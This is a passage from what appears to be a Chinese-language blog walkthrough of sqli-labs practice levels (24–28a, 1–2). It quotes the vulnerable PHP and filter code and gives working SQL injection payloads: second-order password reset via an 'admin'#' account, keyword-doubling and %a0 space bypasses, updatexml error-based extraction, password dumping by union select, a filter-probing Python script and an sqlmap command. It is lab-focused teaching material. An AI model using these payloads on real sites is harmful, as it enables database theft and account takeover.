class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>update</code>在修改密码时，<code>$username</code>直接获取session 并没有做任何过滤处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">sqllogin</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当成功登录时，<code>$_SESSION[&quot;username&quot;]</code>直接取出使用，并没有过滤，所以这里的<code>$username</code>是可控变量</p>
<br>

<br>

<p>先注册一个<code>admin&#39;# </code>账号 随便设置一个密码<code>123456</code>，登录后修改密码为<code>12345</code></p>
<p>使用<code>admin</code> 再次登录发现原密码<code>admin</code>被改成<code>12345</code></p>
<br>

<h3 id="25-or-and被过滤"><a href="#25-or-and被过滤" class="headerlink" title="25 or and被过滤"></a>25 <code>or</code> <code>and</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据图片提示，<code>or</code>和<code>and</code>被过滤了  使用<code>&#39;</code>闭合</p>
<p><code>?id=1&#39; --+</code></p>
<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3为输出点</p>
<p>或者 <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
<p>虽然被过滤掉了，但可以使用双写绕过</p>
<br>

<h3 id="25a-or-and被过滤"><a href="#25a-or-and被过滤" class="headerlink" title="25a or and被过滤"></a>25a <code>or</code> <code>and</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>和25相比 少了<code>&#39;</code></p>
<p><code>?id=1 oorrder by 3</code></p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<h3 id="26-or-and-空格和斜杠被过滤"><a href="#26-or-and-空格和斜杠被过滤" class="headerlink" title="26 or/and/*/-/#/空格和斜杠被过滤"></a>26 <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeToHex</span>(<span class="params">num</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>

<p><code>%20(空格)、%23(#)、%2a(*)、%2d(-)、%2f(/)、%5c(\)，%09-%0d都是制表符、换行符、换页符</code></p>
<p>但是这个题在linux环境下可以解析<code>%a0</code>windows下就无法解析</p>
<p>这一关有三种注入方式:</p>
<ul>
<li>union select 联合注入，用特殊编码符代替空格</li>
<li>报错注入，为了避开空格，选择使用<code>updatexml()</code>和<code>extractvalue()</code></li>
<li>Bool盲注，构造避开空格的语句</li>
</ul>
<p>使用<code>||</code>替换<code>and</code></p>
<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<br>

<h3 id="26a-or-and-空格和斜杠被过滤"><a href="#26a-or-and-空格和斜杠被过滤" class="headerlink" title="26a  or/and/*/-/#/空格和斜杠被过滤"></a>26a  <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="27-空格-union-select被过滤"><a href="#27-空格-union-select被过滤" class="headerlink" title="27 */-/#/空格/*/union/select被过滤"></a>27 <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
<br>

<br>

<h3 id="27a-空格-union-select被过滤"><a href="#27a-空格-union-select被过滤" class="headerlink" title="27a */-/#/空格/*/union/select被过滤"></a>27a <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> 双引号闭合</p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
<br>

<h3 id="28-空格-union-select被过滤"><a href="#28-空格-union-select被过滤" class="headerlink" title="28*/-/#/+/空格/union/select被过滤"></a>28<code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
<br>

<h3 id="28a-空格-union-select被过滤"><a href="#28a-空格-union-select被过滤" class="headerlink" title="28a */-/#/+/空格/union/select被过滤"></a>28a <code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs1</title>
    <url>/posts/2b9109b5/</url>
    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>查字段</p>
<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39; limit 0,1</code></p>
<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&#39;</code>闭合</p>
<p><code>id = 1&#39; --+</code></p>
<p><code>id =1&#39; order by 4 --+</code> #报错 说明有三个字段</p>
<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3是输出点</p>
<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>查表名</p>
<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> 查字段</p>
<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> 查账号密码</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
<p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<br>

<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
<br>

<p>SQLmap</p>
